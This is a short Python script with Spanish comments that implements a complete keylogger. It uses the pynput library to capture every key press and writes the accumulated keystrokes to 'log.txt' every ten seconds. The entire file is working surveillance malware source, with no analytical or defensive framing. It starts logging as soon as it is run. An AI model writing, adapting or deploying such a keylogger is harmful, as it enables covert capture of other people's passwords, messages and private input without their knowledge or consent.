import pynput.keyboard
import threading

# Definir una clase Keylogger
class Keylogger:
    def __init__(self, interval, filename):
        self.interval = interval
        self.filename = filename
        self.log = ""

    # Método para agregar las teclas presionadas al registro
    def append_to_log(self, string):
        self.log = self.log + string

    # Método para procesar las pulsaciones de teclas
    def process_key_press(self, key):
        try:
            self.append_to_log(str(key.char))
        except AttributeError:
            if key == key.space:
                self.append_to_log(" ")
            else:
                self.append_to_log(" " + str(key) + " ")

    # Método para enviar el registro al archivo
    def report(self):
        with open(self.filename, "a") as f:
            f.write(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    # Método para iniciar el keylogger
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

# Crear una instancia de Keylogger y comenzar el keylogger
keylogger = Keylogger(10, "log.txt") # 10 es el intervalo en segundos
keylogger.start()
